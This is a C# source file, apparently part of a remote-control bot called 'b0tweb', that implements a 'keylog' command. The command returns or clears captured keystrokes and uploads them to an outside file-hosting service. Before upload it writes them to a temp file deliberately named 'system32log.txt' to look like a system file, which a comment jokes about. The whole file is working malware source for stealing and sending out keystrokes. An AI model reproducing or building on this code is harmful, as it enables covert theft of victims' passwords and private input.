using System;
using System.IO;

namespace b0tweb.Commands
{
    class KeyloggerCommand : AbstractCommand
    {
        public override string Command => "keylog";

        protected override string ExecuteCommand(string[] args)
        {
            Keylogger keylogger = Keylogger.GetInstance;

            if (args.Length == 0)
            {
                return keylogger.Data;
            }
            else if (args[0].Equals("clear"))
            {
                keylogger.Clear();

                return "keylogger cleared";
            }
            else if (args[0].Equals("upload"))
            {
                return this.uploadLog(keylogger.Data);
            }

            return keylogger.Data;
        }
        /// <summary>
        /// Uploads the keylogger data to file hosting service
        /// </summary>
        /// <param name="log">string data to upload</param>
        /// <returns>url to the uploaded file</returns>
        private string uploadLog(string log)
        {
            // Totally not a shady name
            string path = FileHelper.GetTemporaryFilePath("system32log.txt");

            using (StreamWriter writer = new StreamWriter(path))
            {
                writer.WriteLine(log);
            }

            string url = HTTPUpload.Upload(path);

            FileHelper.DeleteFile(path);

            return url;
        }
    }
}
